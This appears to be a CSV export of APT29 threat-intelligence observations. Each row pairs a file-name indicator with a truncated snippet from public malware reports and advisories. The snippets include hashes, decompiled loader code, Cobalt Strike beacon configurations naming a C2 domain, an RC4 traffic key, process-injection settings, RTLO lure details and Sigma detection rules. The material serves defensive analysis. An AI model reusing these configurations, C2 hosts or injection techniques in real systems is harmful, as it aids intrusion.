1.0.0,actor--apt29,artifact--sha256:d194e61f83844fc6b6e68bfea7e6e9e2044dca4f7758e6ba5e83e7e37708c9bf,observation--sha256:5a606cb58949a784f8c3de2f79f90a8cd12d4a0fc66a2f5ab961419638988f3c,file-name,kernel32.dll,kernel32.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 9/36 The following IDAPython script can be used to recreate the structure used to store module information and API names: name = ""api_load"" struct_id = idc.add_struc(0, name, 0) apis = [""module_base"",""kernel32.dll"",""VirtualAlloc"",""RtlCopyMemory"",""VirtualProtec t"",""VirtualFree"",""GetCurrentProcess"",""GetModuleHandleA"",""K32GetModuleInfo"",""Create FileA"",""CreateFileMapping"",""MapViewOfFile"",""CloseHandle"",""FreeLibrary"",""GetSystemD irectory"",""GetL",
1.0.0,actor--apt29,artifact--sha256:d194e61f83844fc6b6e68bfea7e6e9e2044dca4f7758e6ba5e83e7e37708c9bf,observation--sha256:a43b2055cf8195be93c7b4367b60f4880c6df7ccbfc2b9a18c0bdfeca92e7972,file-name,kernel32.dll,kernel32.dll,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 17/24 bProcInject_StartRWX - True bProcInject_UseRWX - False bProcInject_MinAllocSize - 32668 ProcInject_PrependAppend_x86 - b'\x90\x90\x90\x90\x90\x90\x90\x90\x90' Empty ProcInject_PrependAppend_x64 - b'\x90\x90\x90\x90\x90\x90\x90\x90\x90' Empty ProcInject_Execute - ntdll.dll:RtlUserThreadStart NtQueueApcThread-s SetThreadContext CreateRemoteThread kernel32.dll:LoadLibraryA RtlCreateUserThread ProcInject_AllocationMethod - NtMapViewOfSe,
1.0.0,actor--apt29,artifact--sha256:5b44dccf544965a4688a0b2805a156ed2dcdc3e22445314a2a5a16013d0a1708,observation--sha256:2a5fe8001223fae7179751e0807a2139a23d6e6f4e16e62524b9eaee0e30fd8d,file-name,lechtxibhsfqj.dll,lechtxibhsfqj.dll,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 114}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,S2GRUPO | LAB52113 LAB52 managed to obtain various modules from the malware operators with capabilities in this case to carry out the DCSync attack [18]. 3.4.3. 14 Modules used by operators Table 15. DCSync modules MODULE NAME/ HASH (SHA1) EXPORT 1 EXPORT 2 EXPORT 3 aysklokucxnif.dll (edkb8hva) A133ECF19B8531377F7C4377086F46F6BC90BEA2 A2A241608339688B8AEC3432FD93EACF33F1A83A :q53liiet :5ddfnsfv :uuns50 qjhipfahicihh.dll (ae4s) 0E8F10CBFDDB5A2197A9C5246B66165138DF81EE :bed :j8fyvgp :nxazll lechtx,
1.0.0,actor--apt29,artifact--sha256:5b44dccf544965a4688a0b2805a156ed2dcdc3e22445314a2a5a16013d0a1708,observation--sha256:798a10a385c45f8a00c46e6c7a89e1aa87301da3f498b9cf1480701a15c4094c,file-name,lechtxibhsfqj.dll,lechtxibhsfqj.dll,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 127}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,127 S2GRUPO | LAB52 NAME / SHA1 ACCESS aysklokucxnif.dll A133ECF19B8531377F7C4377086F46F6BC90BEA2 A2A241608339688B8AEC3432FD93EACF33F1A83A Private qjhipfahicihh.dll 0E8F10CBFDDB5A2197A9C5246B66165138DF81EE Private lechtxibhsfqj.dll 16AE9E9ABC0C4F84C5AB8D451F2A184FED0B6D46 B1B302C512185146EF793812052DB92D7F3DBD6D Private 6 .1 DCSync Modules,
1.0.0,actor--apt29,artifact--sha256:e68669fe5287c69b19581195c324f21b7d04d0e3236f062ce9528f8dc0a4843e,observation--sha256:c01dd87d78ee5fa9146bf423af53e9de4261ed8362d8dbca3ba1d0c995fe1cf6,file-name,login.php,login.php,candidate,,unknown,unknown,not-stated,,source--apt29--d219ac10702e638c,APT29/Advisory Further TTPs associated with SVR cyber actors.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Appendix Snort rules Sliver HTTP request URLs are procedurally generated according to a set pattern, as per the implant/sliver/transports/tcp-http.go file. • The resource file extension defines the beacon type. • A random number generator decides whether to include a parent folder in the URL path. • The parent folder and resource filename are randomly chosen from predefined lists per beacon type. • The URL query parameter underscore _ is a numeric value which specifies the payload encoding forma",
1.0.0,actor--apt29,artifact--sha256:e68669fe5287c69b19581195c324f21b7d04d0e3236f062ce9528f8dc0a4843e,observation--sha256:fd9863ebbf6e48aa9e6fdba6e3177f0cbf822a4700485a246ccfe6123e1b0814,file-name,login.php,login.php,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/11 Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 3aca0abdd7ec958a539705d5a4244196 SHA1 bacb46d2ce5dfcaf8544125903f69f01091bc3d6 SHA256 10f1c5462eb006246cb7af5d696163db5facc452befbfd525f72507bb925131d Indicator Value QUATERRIG loader File Name AppvIsvSubsystems64.dll File Size 26KB MD5 9159d3c58c5d970ed25c2db9c9487d7a SHA1 6382ae2061c865ddcb9337f155ae2d036e232dfe SHA256 a42dd6bea439b79db90067b84464e75548,
1.0.0,actor--apt29,artifact--sha256:e68669fe5287c69b19581195c324f21b7d04d0e3236f062ce9528f8dc0a4843e,observation--sha256:a65d38e32ca1c7ac26fe4c2e2542c60623e52eec6b19e30e86ccb981e6ee51d8,file-name,login.php,login.php,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 21/36 The main procedure loop of the QUARTERRIG is similar to the one from SNOWYAMBER: void __fastcall __noreturn running_main(struct_state *malware_state) { int timeout; // edi send_reg_packet(malware_state); while ( 1 ) { timeout = malware_state ->http_timeout; while ( !send_req_packet(malware_state->user_session) ) { timeout *= 2; Sleep(1000 * timeout); } send_healthcheck(&malware_state->user_session); Sleep(1000 * malware_state->http_,
1.0.0,actor--apt29,artifact--sha256:e68669fe5287c69b19581195c324f21b7d04d0e3236f062ce9528f8dc0a4843e,observation--sha256:952da07447867b9e3694dae84e5a2eb99066c340afe252196a3f39121286b94a,file-name,login.php,login.php,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 22/36 Request content is base64 -encoded and RC4 -encrypted using a hardcoded key. The excerpt below shows decrypted content: >>> rc4(b""kusfhuh7874358768HGBJBHeyg3787ycbh"", b64decode(""C7ROIEm80xm+qRX3u P/5eOXEmgU0obmjMdgUzWAi/tpiCK+V+j1bILvi67wAjTPdJchYAMvmfa2E1q/QuCLGmIVh1uDv O6LJAFumgOl4o4w+fcWjyDFeQq9utTg5b9LrIf1QOYb70yy3u8G2R7x5JQ/YXwom6MXV+jYQMlO KbP87BzKhHjY5j0Np/rRAL/HQGNeZ4VUxpM+GMUBXtAgqnD46mNyRVBqhU32MHv/83pGgl+tI8F Xvn54HKAzE82",
1.0.0,actor--apt29,artifact--sha256:e68669fe5287c69b19581195c324f21b7d04d0e3236f062ce9528f8dc0a4843e,observation--sha256:3b067cb20710661aece4e2b954222f41165d507b612d821824c0e6ae1e8a863d,file-name,login.php,login.php,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 33/36 Network IoCs Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 3aca0abdd7ec958a539705d5a4244196 SHA1 bacb46d2ce5dfcaf8544125903f69f01091bc3d6 SHA256 10f1c5462eb006246cb7af5d696163db5facc452befbfd525f72507bb925131d Indicator Value QUATERRIG loader File Name AppvIsvSubsystems64.dll File Size 26KB MD5 9159d3c58c5d970ed25c2db9c9487d7a SHA1 6382ae2061c865ddcb9337f155ae2d036e232dfe SHA256 a42dd6bea439b79db9006,
1.0.0,actor--apt29,artifact--sha256:6e59fafec82fef891def9ee762676efd30d2d8d95d79cf29f294ec26a6b6893e,observation--sha256:c295fbcb30a0c0173bda2a1949e7621b15a0300b1d0aa1823a2b860b90d4c734,file-name,miniduke_indicators_public.pdf,miniduke_indicators_public.pdf,candidate,2013-02-01T00:00:00Z,month,known,same-record,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 37 BIBLIOGRAPHY 1. The White House; Remarks By President Barack Obama In Prague As Delivered; published 5 April 2009; [Online]. Available: https://www.whitehouse.gov/the-press-office/remarks-president-barack-obama-prague-delivered 2. Wikipedia; KavKaz Center; [Online]. Available: https://en.wikipedia.org/wiki/Kavkaz_Center 3. BBC: Nato exercises ‘a dangerous move’; published 17 April 2009; [Online]. Available: http://news.bbc.co.uk/2/hi/ europe/8004399.stm 4. ",
1.0.0,actor--apt29,artifact--sha256:fbba0631e3c96db29b29f84e090b4bcc9294a04aeb82f7de1101d21eac5c9606,observation--sha256:77f29706ecea8dd8d71645615fc9743b6a5a799bc60b5859d03557bba8f9b929,file-name,msbuild.exe,msbuild.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 26}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group One of the Cobalt Strike beacons used by the SilverFish group directly connected to the address tanzaniafisheries.comwithout using the domain fronting technique. That particular Cobalt Stike beacon was deployed to more than 20 victims with file name ms6543223.csproj 6.1 and executed with the command in the following image. Figure 27 .Victim task command executing ms6543223.csproj file Analyst Note : msbuild.exe utility and .csproj files are frequently used to load ,
1.0.0,actor--apt29,artifact--sha256:075db8c77cc2dd5a841438f307d2ad30e9bb67eaea46f3bb9c6639c1aacde8f2,observation--sha256:b78853356ce3b44e5465362612f280ff18ed6368b0984acef730e7f31e055c06,file-name,mschost.dll,mschost.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 11/20 envsrv.dll Envsrv.dll is responsible for facilitating persistence via the Run registry key. Envsrv.dll has one export (named unify, ord #2). It closely follows a previously established pattern, reusing exactly the same code blocks. A simplified codeflow is presented on the listing below: 1. __int64 unify() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleepEmulation(); 7. Initialize",
1.0.0,actor--apt29,artifact--sha256:075db8c77cc2dd5a841438f307d2ad30e9bb67eaea46f3bb9c6639c1aacde8f2,observation--sha256:b378ffdc1d96c6a28170ba3cb071dc7a31da4880954312d2196a1ffc9938480a,file-name,mschost.dll,mschost.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 12/20 mschost.dll The final module of HALFRIG is used to launch the Cobalt Strike beacon. DLL exports only one function – create. Create uses exactly the same pattern as previous modules. Figure 8 - reconstructed create function The new thread that is spawned is responsible for allocating memory for the shellcode, decrypting it, and executing the CobaltStrike beacon shellcode. The new thread starts with the same pattern as previous thread",
1.0.0,actor--apt29,artifact--sha256:075db8c77cc2dd5a841438f307d2ad30e9bb67eaea46f3bb9c6639c1aacde8f2,observation--sha256:2cfa3f90497b36e5b988468cbb3ea3f5db5d99c6a625f46adc4e0278596ec443,file-name,mschost.dll,mschost.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 17/20 Indicator Value 3rd module File Name envsrv.dll File Size 56KB MD5 2ffaa8cbc7f0d21d03d3dd897d974dba SHA1 6dff9a9f13300a5ce72a70d907ff7854599e990a SHA256 cfa65036aff012d7478694ea733e3e882cf8e18f336af5fba3ed2ef29160d45b Indicator Value 4th module (shellcode stager) File Name mschost.dll File Size 391KB MD5 5b6d8a474c556fe327004ed8a33edcdb SHA1 a677b6aa958fe02cac0730d36e8123648e02884f SHA256 86edfd6c7a2fab8c50a372494e3d5b08c032cca75439,
1.0.0,actor--apt29,artifact--sha256:075db8c77cc2dd5a841438f307d2ad30e9bb67eaea46f3bb9c6639c1aacde8f2,observation--sha256:ee3dafa9e5568f0a1952355efdde3ca08105402d047084a145b6e8cca3ef3bf0,file-name,mschost.dll,mschost.dll,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/11 Indicator Value 3rd module File Name envsrv.dll File Size 56KB MD5 2ffaa8cbc7f0d21d03d3dd897d974dba SHA1 6dff9a9f13300a5ce72a70d907ff7854599e990a SHA256 cfa65036aff012d7478694ea733e3e882cf8e18f336af5fba3ed2ef29160d45b Indicator Value 4th module (shellcode stager) File Name mschost.dll File Size 391KB MD5 5b6d8a474c556fe327004ed8a33edcdb SHA1 a677b6aa958fe02cac0730d36e8123648e02884f SHA256 86edfd6c7a2fab8c50a372494e3d5b08c032cca754396,
1.0.0,actor--apt29,artifact--sha256:e9de77b116092a4e6086ba06b1e567cc55b1282191bb84dd33027febf5fbb7e5,observation--sha256:b5b2f00031a33a841bd4828136c22ca2991cefbd6dab976e43f475bba1008da6,file-name,msword.dll,msword.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 16/20 Appendix A – IOCs File IoCs Indicator Value Legitimate binary used for loading malicious DLL File Name Note .exe File Size 1597KB MD5 83863beee3502e42ced7e4b6dacb9eac SHA1 d9d40cb3e2fe05cf223dc0b592a592c132340042 SHA256 cb470d77087518ed7bc53ca624806c265ae2485d40ec212acc2559720940fb27 Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 0e5ed33778ee9c020aa067546384abcb SHA1 fbb482415f5312ed64b3a0ebee7fed5e66,
1.0.0,actor--apt29,artifact--sha256:e9de77b116092a4e6086ba06b1e567cc55b1282191bb84dd33027febf5fbb7e5,observation--sha256:63123e32d3a12544ee75542b00024092c9dd3116b9e4f5cc88a989fe4331273b,file-name,msword.dll,msword.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 2/20 Table of Contents Table of Contents ................................ ................................ ................................ ................................ ................................ .......... 2 Threat Summary ................................ ................................ ................................ ................................ ................................ ............ 3 Detailed Technical Analysis ,
1.0.0,actor--apt29,artifact--sha256:e9de77b116092a4e6086ba06b1e567cc55b1282191bb84dd33027febf5fbb7e5,observation--sha256:26c3571a5d111bd50450067918895d2c64dbbe584f95283e9137e085a2cdaae5,file-name,msword.dll,msword.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 9/20 msword.dll This module facilitates OPSEC (unhooking, checking for sleep() emulation, checking for process tree). The module contains a large number of inlined string decryption routines. The following listing presents (heavily) cleaned-up code of the msword.dll get export that is called by AppvIsvSubsystems64.dll: 1. __int64 get() 2. { 3. // 4. pUnhookedAPIs = getAPIs(&UnhookedAPIs); 5. pProcessModules = &UnhookedAPIs.K32EnumProcessM",
1.0.0,actor--apt29,artifact--sha256:e9de77b116092a4e6086ba06b1e567cc55b1282191bb84dd33027febf5fbb7e5,observation--sha256:16065145267595d1de8bdc28e12c778fb674608be7fe5f059ea0006e5cc44bce,file-name,msword.dll,msword.dll,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 6/11 HALFRIG Indicator Value Legitimate binary used for loading malicious DLL File Name Note .exe File Size 1597KB MD5 83863beee3502e42ced7e4b6dacb9eac SHA1 d9d40cb3e2fe05cf223dc0b592a592c132340042 SHA256 cb470d77087518ed7bc53ca624806c265ae2485d40ec212acc2559720940fb27 Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 0e5ed33778ee9c020aa067546384abcb SHA1 fbb482415f5312ed64b3a0ebee7fed5e6610c21a SHA256 d1455c4,
1.0.0,actor--apt29,artifact--sha256:7e6b069a0f01afdc05acd3f624d8bb1aefbeb6e44d3b4e4c6aa1191ab0dbc3d3,observation--sha256:a0fa41f3bcb929933e5cef4acc91726d409c59090283a7ba1d7fc8617303cb40,file-name,named140runtime.dll,named140runtime.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Once the shellcode is decrypted, it is indirectly spawned in a new thread byabusing FLS callbacks toobtain execution control as shown inFigure 14. Ratherthan specifying the shellcode’s address as thestart address for the thread, NTDLL’s rtlFlsAlloc is used instead. The rtlFlsAlloc function is used toallocatefiber local storageand takes a callbackfunction as an argument. GraphicalNeutrino creates thethread in a suspended state and updates the thread’s context to have the RCX",
1.0.0,actor--apt29,artifact--sha256:20458ba71cf14dc6314d6db5cc4f969382463d391a55a63d6ff3ee1b43086dbc,observation--sha256:cd6c9ccaaeecd02745e059855a83aa39479acdb34dbb4b9c569931407436035d,file-name,nltest.exe,nltest.exe,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 15 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR selection: Image|endswith: - 'whoami.exe' CommandLine|contains: - 'priv' - 'PRIV' condition: selection falsepositives: legitimate use by system administrator title: DC listing via nltest description: Detects nltest.exe execution and DC listing author: references: date: 2023/11/15 logsource: category: process_creation product: windows detection: selection: Image|endswith: - 'nltest.exe' CommandLine|re: '.*dclist\:,
1.0.0,actor--apt29,artifact--sha256:cd2331d768618f94cc2726c5360a59acf2d5479e0e8721456e2f4246bcc443ce,observation--sha256:a9082c6f0882f9c59cc8f42ca4518bc1d1c162e571d40d577cd02e1456dc200a,file-name,november_schedulexe.pdf,november_schedulexe.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Malware The malicious ZIP file “schedule.zip”  SHA256cf160175c661efd4b1e1eecadf5f00f7203ef4c7445e36e3373d50b26086c552  was auto-downloadedfrom totalmassasje[.]no and contains three files, as shown inTable 1. Filename File Type SHA256 november_schedulexe.pdf EXE 844e902977b478eace8568f49dd9e5c91db8e534f3c5410ee663d0be02bdf7e3 vcruntime140.dll DLL a0c3e6cd167b93f4646a7a3f2d46ed8bd4888d861b533662a66ca9711d49db1f 7za.dll DLL 381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62",
1.0.0,actor--apt29,artifact--sha256:cd2331d768618f94cc2726c5360a59acf2d5479e0e8721456e2f4246bcc443ce,observation--sha256:6bae15655e71222ce82eb31d607ab52c7544b1d67db82818e2a7b26d2e6651d2,file-name,november_schedulexe.pdf,november_schedulexe.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Figure 4 File details of november_schedulexe.pdf Source: Recorded Future) The filename november_schedulexe.pdf tries to trick the user into thinking it ends with “.pdf” (the PDFfile extension), when in fact the filename ends with “.exe”. It does this by implementing the right-to-leftoverride  RTLO  technique, which supports languages written right to left. A hexdump of the filename,as shown inFigure 5,helps to represent this by displayingthe extra bytes that enable RTLO. 00",
1.0.0,actor--apt29,artifact--sha256:cd2331d768618f94cc2726c5360a59acf2d5479e0e8721456e2f4246bcc443ce,observation--sha256:be3e5ef234d7fea17f54c51dcc978e700ca08a70d9d047ad96d48802ce3d5b52,file-name,november_schedulexe.pdf,november_schedulexe.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS be version 14.30.30704.0; however, a comparison with the legitimate version of the DLL  SHA256 081a273ad809f650ebaeb91c11fcc7a1ad91232a7228f8e98b52191fe44cb06d) reveals that the file hasbeen modified. A side-by-side comparison of each DLL’s Properties window is shown inFigure 6withthe legitimate version on the left and the modified version on the right. Notably, the modified versionhas also removed Microsoft’s digital signature. Figure 6 Comparison of the legitimate (left) ",
1.0.0,actor--apt29,artifact--sha256:cd2331d768618f94cc2726c5360a59acf2d5479e0e8721456e2f4246bcc443ce,observation--sha256:bc40c1d6dcdf12d7d0b29c2bd7bffef281676aacdf0f217884b25b42e6b2d4e1,file-name,november_schedulexe.pdf,november_schedulexe.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/24 Container File – ZIP In October 2022, the adversary used a ZIP archive to deliver SNOWYAMBER. Schedule.zip contained the following files: . ├── 7za.dll ├── november_schedul exe.pdf └── vcruntime140.dll Filename november_schedulexe.pdf uses the right-to-left override technique to attempt to mimic the pdf extension while in fact, it is .exe. The file is a renamed, legitimate 7-zip executable. Vcruntime140.dll is a benign, although modi",
1.0.0,actor--apt29,artifact--sha256:b075d8bdb8e2455aad294b82f523bb28527aeac43d3f0af2623202fc477f8b9b,observation--sha256:0fbb9c05187a1738827240832ff45771a1a1af86d4f26e70eb118e1947288274,file-name,ntdll.dll,ntdll.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 14/20 Cobalt Strike Configuration The listing below presents CobaltStrike beacon configuration: 1. { 2. ""BeaconType"": [ 3. ""HTTPS"" 4. ], 5. ""Port"": 443, 6. ""SleepTime"": 60000, 7. ""MaxGetSize"": 1398102, 8. ""Jitter"": 18, 9. ""C2Server"": ""communitypowersports.com,/owa/L7k2NQpwPNLq4C2dHD6TRv00GCH1axhaWv"", 10. ""HttpPostUri"": ""/owa/o9besAWTTVJKNeyrfOOy2tn-epXE7f"", 11. ""Malleable_C2_Instructions"": [ 12. ""Base64 URL-safe decode"" 13. ], 14. ""HttpGe",
1.0.0,actor--apt29,artifact--sha256:b075d8bdb8e2455aad294b82f523bb28527aeac43d3f0af2623202fc477f8b9b,observation--sha256:053ecbdc2c18ed78cb1bc721b027320eb0c007fff67f592e6296c064754f7fcb,file-name,ntdll.dll,ntdll.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 25/36 SSH_Banner - HttpGet_Verb - GET HttpPost_Verb - POST HttpPostChunk - 0 Spawnto_x86 - %windir%\syswow64\powercfg.exe Spawnto_x64 - %windir%\sysnative\powercfg.exe CryptoScheme - 0 Proxy_Config - Not Found Proxy_User - Not Found Proxy_Password - Not Found Proxy_Behavior - Use IE settings Watermark_Hash - Not Found Watermark - 1359593325 bStageCleanup - True bCFGCaution - False KillDate - 0 bProcInject_StartRWX - True bProcInject_UseRW,
1.0.0,actor--apt29,artifact--sha256:b075d8bdb8e2455aad294b82f523bb28527aeac43d3f0af2623202fc477f8b9b,observation--sha256:9da393b836f13e6e9309f8c8ceac04dce5b299ddb61f41fccf8eeabf3a9c95ac,file-name,ntdll.dll,ntdll.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 27/36 Proxy_Config - Not Found Proxy_User - Not Found Proxy_Password - Not Found Proxy_Behavior - Use IE settings Watermark_Hash - Not Found Watermark - 1359593325 bStageCleanup - True bCFGCaution - False KillDate - 0 bProcInject_StartRWX - True bProcInject_UseRWX - False bProcInject_MinAllocSize - 6785 ProcInject_PrependAppend_x86 - b'\x90\x90\x90\x90\x90\x90\x90\x90\x90' Empty ProcInject_PrependAppend_x64 - b'\x90\x90\x90\x90\x90\x90\x9,
1.0.0,actor--apt29,artifact--sha256:b075d8bdb8e2455aad294b82f523bb28527aeac43d3f0af2623202fc477f8b9b,observation--sha256:246e12f78d62d23c8a5a6cbd8b9bb36cb24ef562337d0fcabf117be382edfd17,file-name,ntdll.dll,ntdll.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 29/36 Proxy_Config - Not Found Proxy_User - Not Found Proxy_Password - Not Found Proxy_Behavior - Use IE settings Watermark_Hash - Not Found Watermark - 1359593325 bStageCleanup - True bCFGCaution - False KillDate - 0 bProcInject_StartRWX - True bProcInject_UseRWX - False bProcInject_MinAllocSize - 6785 ProcInject_PrependAppend_x86 - b'\x90\x90\x90\x90\x90\x90\x90\x90\x90' Empty ProcInject_PrependAppend_x64 - b'\x90\x90\x90\x90\x90\x90\x9,
1.0.0,actor--apt29,artifact--sha256:b075d8bdb8e2455aad294b82f523bb28527aeac43d3f0af2623202fc477f8b9b,observation--sha256:2665468da880d69c6c402be0a52980c62ddeeea01d40c600f238a00e548b5077,file-name,ntdll.dll,ntdll.dll,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 17/24 bProcInject_StartRWX - True bProcInject_UseRWX - False bProcInject_MinAllocSize - 32668 ProcInject_PrependAppend_x86 - b'\x90\x90\x90\x90\x90\x90\x90\x90\x90' Empty ProcInject_PrependAppend_x64 - b'\x90\x90\x90\x90\x90\x90\x90\x90\x90' Empty ProcInject_Execute - ntdll.dll:RtlUserThreadStart NtQueueApcThread-s SetThreadContext CreateRemoteThread kernel32.dll:LoadLibraryA RtlCreateUserThread ProcInject_AllocationMethod - NtMapViewOfSe,
